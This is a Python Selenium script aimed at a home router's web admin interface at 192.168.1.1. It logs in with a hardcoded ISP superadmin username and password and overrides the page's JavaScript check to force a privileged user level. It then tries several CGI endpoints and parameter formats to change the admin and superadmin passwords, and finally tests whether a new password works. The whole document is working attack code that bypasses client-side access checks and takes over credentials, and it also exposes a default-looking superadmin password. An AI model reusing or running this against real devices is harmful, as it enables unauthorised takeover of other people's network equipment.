#!/usr/bin/env python3
"""Try POST to MdfPwdAdmin.cgi (exists, returns 403 for GET) from superadmin session."""
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import os, time, json

ROUTER = "https://192.168.1.1"

def setup_driver():
    opts = Options()
    opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--ignore-certificate-errors")
    opts.add_argument("--window-size=1280,720")
    opts.add_argument("--incognito")
    for p in [r"C:\Program Files\Google\Chrome\Application\chrome.exe",
              r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"]:
        if os.path.exists(p):
            opts.binary_location = p
            break
    driver = webdriver.Chrome(options=opts)
    driver.set_page_load_timeout(15)
    return driver

driver = setup_driver()
try:
    # Login as superadmin
    print("1. Login as adminpldt with forced Userlevel=2...")
    driver.get(ROUTER + "/admin.html")
    time.sleep(5)
    driver.execute_script("window.CheckPassword = function(pwd) { return 2; }; window.setDisable = function() {};")
    u = driver.find_element(By.ID, "txt_Username")
    p = driver.find_element(By.ID, "txt_Password")
    driver.execute_script("arguments[0].value=''; arguments[1].value='';", u, p)
    u.send_keys("adminpldt")
    p.send_keys("AC2DIU7QW3ERTY6UPAS4DFG")
    driver.execute_script("document.getElementById('button').style.display = '';")
    driver.find_element(By.ID, "button").click()
    time.sleep(5)
    lvl = driver.execute_script("return window.Userlevel;")
    print("   Userlevel:", lvl)

    # Skip form
    driver.execute_script("""
        document.getElementById('base_mask').style.display = 'none';
        document.getElementById('pwd_modify').style.display = 'none';
    """)

    # Get CSRF token
    token = driver.execute_script("""
        var t = null;
        $.ajax({type:'POST', async:false, url:'/asp/GetRandCount.asp', success: function(d) { t = d; }});
        return t;
    """)
    print("   Token:", token[:50] if token else "none")

    new_pwd = "Admin9999"
    old_pwd = "AC2DIU7QW3ERTY6UPAS4DFG"

    # 2. Try POST to MdfPwdAdmin.cgi (the one that exists, returns 403 for GET)
    print("\n2. POST to MdfPwdAdmin.cgi...")
    admin_domain = "InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.1"
    superadmin_domain = "InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.2"

    for cgi in ["MdfPwdAdmin.cgi", "MdfPwdNormal.cgi"]:
        for domain in [admin_domain, superadmin_domain]:
            for file_param in ["login.asp", "admin.html"]:
                url = cgi + "?z=" + domain + "&RequestFile=" + file_param
                params = "z.Password=" + new_pwd + "&z.OldPassword=" + old_pwd + "&x.X_HW_Token=" + (token or "")
                try:
                    r = driver.execute_script("""
                        var result = null;
                        $.ajax({type:'POST', async:false, cache:false, url: arguments[0], data: arguments[1],
                            success: function(d) { result = {ok: true, data: String(d).substring(0, 500), code: 200}; },
                            error: function(xhr) { result = {ok: false, code: xhr.status, resp: xhr.responseText ? xhr.responseText.substring(0, 200) : ''}; }
                        });
                        return result;
                    """, url, params)
                    code = r.get("code", "?")
                    resp = r.get("data", r.get("resp", ""))
                    if code != 404:
                        print("  " + cgi + " z=" + domain.split(".")[-1] + " file=" + file_param + " -> " + str(code) + " " + str(resp)[:150])
                except Exception as e:
                    pass

    # 3. Try with different parameter formats
    print("\n3. Trying different param formats...")
    for format_name, params in [
        ("standard", "z.Password=" + new_pwd + "&z.OldPassword=" + old_pwd + "&x.X_HW_Token=" + (token or "")),
        ("body_only", "Password=" + new_pwd + "&OldPassword=" + old_pwd + "&x.X_HW_Token=" + (token or "")),
        ("encoded", "z.Password=" + new_pwd + "&x.X_HW_Token=" + (token or "")),
        ("minimal", "x.X_HW_Token=" + (token or "")),
    ]:
        try:
            r = driver.execute_script("""
                var result = null;
                $.ajax({type:'POST', async:false, cache:false, url: arguments[0], data: arguments[1],
                    success: function(d) { result = {ok: true, data: String(d).substring(0, 500), code: 200}; },
                    error: function(xhr) { result = {ok: false, code: xhr.status, resp: xhr.responseText ? xhr.responseText.substring(0, 200) : ''}; }
                });
                return result;
            """, "MdfPwdAdmin.cgi?z=" + admin_domain + "&RequestFile=admin.html", params)
            code = r.get("code", "?")
            if code != 404:
                print("  " + format_name + " -> " + str(code) + " " + str(r.get("data", r.get("resp", "")))[:150])
        except Exception as e:
            pass

    # 4. Also try to POST to admin.html with password data (maybe it processes it)
    print("\n4. Trying to POST admin.html with password data...")
    params = "z.Password=" + new_pwd + "&z.OldPassword=" + old_pwd + "&UserName=adminpldt&PassWord=AC2DIU7QW3ERTY6UPAS4DFG&x.X_HW_Token=" + (token or "")
    try:
        r = driver.execute_script("""
            var result = null;
            $.ajax({type:'POST', async:false, cache:false, url: 'admin.html', data: arguments[0],
                success: function(d) { result = {ok: true, data: String(d).substring(0, 200), code: 200}; },
                error: function(xhr) { result = {ok: false, code: xhr.status}; }
            });
            return result;
        """, params)
        print("  admin.html POST -> " + str(r))
    except Exception as e:
        print("  Error:", e)

    # 5. Try to use webSubmitForm from the page itself
    print("\n5. Trying webSubmitForm directly...")
    js = """
        var result = null;
        try {
            var token = null;
            $.ajax({type:'POST', async:false, cache:false, url:'/asp/GetRandCount.asp',
                success: function(d) { token = d; }});

            var Form = new webSubmitForm();
            Form.addParameter('z.Password', '%s');
            Form.addParameter('z.OldPassword', '%s');
            Form.addParameter('z.Language', 'english');
            Form.addParameter('x.X_HW_Token', token);

            var urls = [
                'MdfPwdAdmin.cgi?z=InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.2&RequestFile=admin.html',
                'MdfPwdAdmin.cgi?z=InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.1&RequestFile=admin.html',
            ];

            var results = [];
            for (var u = 0; u < urls.length; u++) {
                try {
                    var f = new webSubmitForm();
                    f.addParameter('z.Password', '%s');
                    f.addParameter('z.OldPassword', '%s');
                    f.addParameter('z.Language', 'english');
                    f.addParameter('x.X_HW_Token', token);
                    f.setAction(urls[u]);
                    var body = [];
                    for (var i = 0; i < f.params.length; i++) {
                        body.push(f.params[i].name + '=' + encodeURIComponent(f.params[i].value));
                    }
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', urls[u], false);
                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                    xhr.send(body.join('&'));
                    results.push({url: urls[u], code: xhr.status, resp: xhr.responseText.substring(0, 200)});
                } catch(e2) {
                    results.push({url: urls[u], error: e2.message});
                }
            }
            result = results;
        } catch(e) {
            result = {error: e.message};
        }
        return result;
    """ % (new_pwd, old_pwd, new_pwd, old_pwd)
    try:
        r = driver.execute_script(js)
        for item in r:
            print("  " + item.get("url", "?")[:50] + " -> " + str(item.get("code", item.get("error", "?"))) + " " + item.get("resp", "")[:100])
    except Exception as e:
        print("  Error:", e)

    # 6. Final check: try login with new password
    print("\n6. Checking if any password change took effect...")
    driver.get(ROUTER + "/login.asp")
    time.sleep(3)
    has_login = "txt_Username" in driver.page_source
    if has_login:
        u = driver.find_element(By.ID, "txt_Username")
        p = driver.find_element(By.ID, "txt_Password")
        driver.execute_script("arguments[0].value=''; arguments[1].value='';", u, p)
        u.send_keys("admin")
        p.send_keys(new_pwd)
        driver.execute_script("window.CheckPassword = function() { return 0; }; window.setDisable = function() {};")
        driver.execute_script("document.getElementById('button').style.display='';")
        driver.find_element(By.ID, "button").click()
        time.sleep(5)
        has_login2 = "txt_Username" in driver.page_source
        print("   admin:" + new_pwd + " -> login:" + str(has_login2))

finally:
    driver.quit()
